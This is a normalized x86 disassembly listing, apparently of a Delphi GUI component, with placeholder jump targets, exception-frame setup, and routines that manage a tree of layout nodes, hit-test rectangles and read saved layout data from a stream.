movzx eax [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_404974
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a4dc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e10
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42b908
mov edx eax
mov eax ebx
call sub_424f8c
mov eax [ ebp - 0x4 ]
call sub_45ad3c
xor eax eax
push ebp
push sub_45ac75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_45a73c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac7c
mov eax [ ebp - 0x4 ]
call sub_45ad40
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4546ac
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_45ac7c
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_45c920
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_45acd0
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_45bf64
mov eax [ esi + 0x10 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_45ad54
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_45ad54
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_45ad54
pop ecx
sub_45adac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_45ad54
pop ecx
sub_45add8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45add8
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45add8
pop ecx
sub_45ae2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_45adac
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_45a684
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_45a684
push eax
mov edx 0x1
mov eax ebx
call sub_45a600
push eax
mov edx 0x2
mov eax ebx
call sub_45a600
pop edx
pop ecx
call sub_418470
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_403af4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45aeb0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_45a8dc
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_418470
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4501d4
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a4dc
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_45adac
mov [ ebp - 0x8 ] eax
movzx eax [ ebp - 0x1 ]
movzx eax [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_45a500
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_45c000
mov edx esi
mov eax ebx
call sub_45adac
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_450834
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a4dc
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
movzx eax [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
movzx eax [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_450820
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
movzx edx [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_45a684
mov edx eax
mov eax edi
call sub_45aa80
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_45a684
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_45a684
mov edx eax
mov eax edi
call sub_45aa80
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_45a684
mov [ ebx + 0x68 ] eax
jmp r-xdata
movzx edx [ ebp - 0x9 ]
push edx
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_45b0cc
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_45b274
jmp r-xdata
sub_45b0cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a4dc
mov ebx eax
movzx eax [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_45aa58
mov edx eax
mov eax ebx
call sub_45aa80
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_45aa80
mov eax [ esi + 0x64 ]
call sub_45aa58
mov [ esi + 0x68 ] eax
movzx eax [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_45c388
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45ae14
mov eax [ esi + 0x64 ]
call sub_45aa58
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_45c388
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45ae14
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_45c7d8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_45ae14
mov eax [ esi + 0x64 ]
call sub_45aa58
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_45c910
xor edx edx
mov eax esi
call sub_45ae14
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_45aa80
adc edx 0x0
mov eax ebx
call sub_45a73c
mov eax ebx
call sub_45aad4
push esi
push sub_45c910
xor edx edx
mov eax esi
call sub_45ae14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_45b274
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_45a73c
mov eax [ ebx + 0x14 ]
call sub_45aad4
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_45b2ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov edx 0x1
mov eax esi
call sub_45a600
mov edi eax
mov edx 0x2
mov eax esi
call sub_45a600
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0xc ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx 0x1
mov eax esi
call sub_45a684
add edi eax
cmp edi [ ebx + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax esi
call sub_45a684
add eax [ ebp - 0xc ]
cmp eax [ ebx ]
jl r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
cmp edx [ ebx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
sub_45b3f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov edi edx
mov ebp eax
mov eax [ ebp + 0x14 ]
call sub_4546e8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
mov edx esi
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
mov ecx esp
call sub_418420
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1da ] 0x0
je r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45b47c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_45aa58
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_45aa58
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_45aa58
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x40 ]
test al al
je r-xdata
mov eax ebx
call sub_45aa58
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_45ab34
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45ab5c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ab34
call sub_45b47c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ab5c
call sub_45b47c
pop ecx
sub_45b590
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_45b3f0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_45ab5c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0x94 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_45adac
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_45ab5c
call sub_45b47c
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_45b618
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_405530
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_405c6c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_45b660
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45b9a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0xc ]
call sub_45bf64
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x74 ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0xc ]
call sub_45ad3c
xor eax eax
push ebp
push sub_45b97e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x1c ] 0x40000
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x0
mov [ ebp - 0x26 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x26 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
movzx edx [ ebp - 0x26 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
call sub_45d054
mov edx [ ebp - 0xc ]
mov [ edx + 0x68 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov si 0xffb7
call sub_40484c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b985
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x25 ]
mov [ eax + 0x74 ] dl
mov eax [ ebp - 0xc ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a4dc
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
push ebp
lea eax [ ebp - 0x8 ]
call sub_45b618
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_4507b4
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_451694
mov eax [ ebp - 0xc ]
call sub_45ad40
retn
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a4dc
mov edx [ ebp - 0xc ]
mov [ edx + 0x64 ] eax
push ebp
lea eax [ ebp - 0x8 ]
call sub_45b618
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov edx [ ebx + 0x20 ]
mov eax [ ebp - 0xc ]
call sub_45d054
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_45a828
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_404650
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov [ ebp - 0x2c ] esi
mov esi [ esi + 0x18 ]
mov eax [ ebp - 0x2c ]
call sub_404650
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x24 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
sub_45b9b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_418448
call sub_432228
call sub_432330
test al al
je r-xdata
push 0x0
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_425714
push eax
call DrawFrameControl
call sub_432228
lea ecx [ ebp - 0xc ]
mov dl 0x34
call sub_432570
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_425714
push eax
call sub_432228
lea ecx [ ebp - 0xc ]
pop edx
call sub_4323ec
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ba48
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
